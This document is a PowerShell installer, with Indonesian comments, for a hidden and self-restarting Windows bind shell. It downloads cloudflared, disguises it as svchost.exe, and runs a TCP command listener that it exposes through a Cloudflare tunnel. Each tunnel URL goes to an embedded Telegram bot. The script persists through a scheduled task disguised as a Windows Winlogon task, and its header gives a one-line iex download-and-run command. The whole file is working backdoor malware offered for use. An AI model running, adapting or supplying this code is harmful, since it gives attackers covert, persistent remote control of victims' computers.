# Cloudflare Tunnel Reverse Shell for Windows (Hidden, Auto-Restart)
# Jalankan (sebagai Administrator):
#   iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/VampXDH/Ocean-Shell/main/win.ps1').Content
# Uninstall:
#   $env:CF_UNINSTALL = "<token>"; iex (iwr -UseBasicParsing 'https://.../win.ps1').Content

$ErrorActionPreference = "Stop"

# ========== KONFIGURASI ==========
$userHome = $env:USERPROFILE
$configDir = "$userHome\.config\dbus"
$tmpDir = "$env:TEMP\.cf-$([System.Environment]::UserName)"
$binHiddenName = "svchost.exe"
$port = Get-Random -Minimum 10000 -Maximum 50000

# Telegram (ganti dengan milik Anda)
$telegramBotToken = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
$telegramChatId = "6223261018"

# Arsitektur & download cloudflared
$arch = if ([Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
$urlCloudflared = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$arch.exe"
$cfPath = "$configDir\$binHiddenName"

# ========== FUNGSI ==========
function Send-Telegram($message) {
    if ($telegramBotToken -and $telegramBotToken -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
        $body = @{ chat_id = $telegramChatId; text = $message; parse_mode = "HTML" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue
    }
}

# ========== UNINSTALL ==========
if ($env:CF_UNINSTALL) {
    $tokenFile = "$configDir\.uninstall_token"
    if (Test-Path $tokenFile) {
        $storedToken = Get-Content $tokenFile -Raw
        if ($env:CF_UNINSTALL -eq $storedToken) {
            Write-Host "Removing installed files..."
            schtasks /End /TN "Microsoft\Windows\Winlogon\Shell" 2>$null
            schtasks /Delete /TN "Microsoft\Windows\Winlogon\Shell" /F 2>$null
            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*cloudflared*" } | Stop-Process -Force
            Remove-Item -Recurse -Force $configDir -ErrorAction SilentlyContinue
            Remove-Item -Recurse -Force $tmpDir -ErrorAction SilentlyContinue
            Write-Host "Uninstall complete."
            exit 0
        } else {
            Write-Host "Invalid token."
            exit 1
        }
    } else {
        Write-Host "No installation found."
        exit 1
    }
}

# ========== INSTALL ==========
if (Test-Path "$configDir\.uninstall_token") {
    Write-Host "Installation already detected. Uninstall first with token."
    exit 1
}

New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
New-Item -ItemType Directory -Force -Path $configDir | Out-Null

Write-Host "Downloading cloudflared..."
Invoke-WebRequest -Uri $urlCloudflared -OutFile $cfPath -ErrorAction Stop

# Buat token uninstall
$token = -join ((48..57) + (97..102) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
$token | Out-File -FilePath "$configDir\.uninstall_token"

# Simpan port untuk referensi
@"
PORT=$port
"@ | Out-File -FilePath "$configDir\tunnel.conf"

# ========== BUAT SCRIPT MONITOR (runner) ==========
# Script ini akan dijalankan oleh scheduled task, memastikan bindshell + tunnel selalu hidup
$monitorScript = "$configDir\cf_monitor.ps1"
@"
# Monitor script: menjaga bindshell dan cloudflared tetap berjalan
`$port = $port
`$cfPath = "$cfPath"
`$tmpDir = "$tmpDir"
`$telegramBotToken = "$telegramBotToken"
`$telegramChatId = "$telegramChatId"

function Send-Telegram(`$message) {
    if (`$telegramBotToken -and `$telegramBotToken -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
        `$body = @{ chat_id = `$telegramChatId; text = `$message; parse_mode = "HTML" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot`$telegramBotToken/sendMessage" -Method Post -Body `$body -ErrorAction SilentlyContinue
    }
}

# Jalankan bindshell (listener TCP) di background menggunakan PowerShell
function Start-Bindshell {
    param(`$port)
    `$listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', `$port)
    `$listener.Start()
    while (`$true) {
        `$client = `$listener.AcceptTcpClient()
        `$stream = `$client.GetStream()
        `$writer = New-Object System.IO.StreamWriter `$stream
        `$reader = New-Object System.IO.StreamReader `$stream
        `$writer.AutoFlush = `$true
        `$writer.WriteLine('> ')
        while (`$client.Connected) {
            if (`$stream.DataAvailable) {
                `$cmd = `$reader.ReadLine()
                if (`$cmd -eq 'exit') { break }
                `$output = & `$cmd 2>&1 | Out-String
                `$writer.WriteLine(`$output)
                `$writer.Write('> ')
            }
        }
        `$client.Close()
    }
}

# Mulai bindshell sebagai job agar bisa dimonitor
`$bindJob = Start-Job -ScriptBlock { Start-Bindshell -port `$using:port }
# Tunggu sebentar agar listener aktif
Start-Sleep -Seconds 2

`$urlSent = `$false
`$logFile = "`$tmpDir\cloudflared.log"
`$errFile = "`$tmpDir\cloudflared.err"

while (`$true) {
    # Jalankan cloudflared (tunnel)
    `$tunnelProc = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$logFile -RedirectStandardError `$errFile

    # Tunggu hingga URL muncul (maks 30 detik)
    `$url = `$null
    for (`$i = 0; `$i -lt 30; `$i++) {
        `$url = Select-String -Path `$logFile,`$errFile -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" -ErrorAction SilentlyContinue | Select-Object -First 1 | ForEach-Object { `$_.Matches[0].Value }
        if (`$url) { break }
        Start-Sleep -Seconds 1
    }
    if (`$url -and -not `$urlSent) {
        Send-Telegram "✅ New tunnel URL: `$url"
        `$urlSent = `$true
    } elseif (-not `$url) {
        Send-Telegram "⚠️ Tunnel started but URL not found. Check logs."
    }

    # Tunggu hingga tunnel mati
    `$tunnelProc.WaitForExit()
    # Kirim notifikasi jika tunnel mati (opsional)
    Send-Telegram "⚠️ Tunnel died. Restarting..."
    Start-Sleep -Seconds 5
    `$urlSent = `$false   # reset agar URL baru dikirim
}
"@ | Out-File -FilePath $monitorScript -Encoding UTF8

# ========== PERSISTENCE (Scheduled Task) ==========
$taskName = "Microsoft\Windows\Winlogon\Shell"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorScript`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserID $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

# Jalankan monitor sekali sekarang
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorScript`"" -WindowStyle Hidden

Write-Host "--> Installation complete."
Write-Host "--> Tunnel and bindshell will auto-restart if killed."
Write-Host "--> New URLs will be sent via Telegram."
Write-Host "--> To uninstall: `$env:CF_UNINSTALL = '$token'; powershell -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VampXDH/Ocean-Shell/main/win.ps1')`""
Write-Host "--> Join us on Telegram - https://t.me/thcorg"
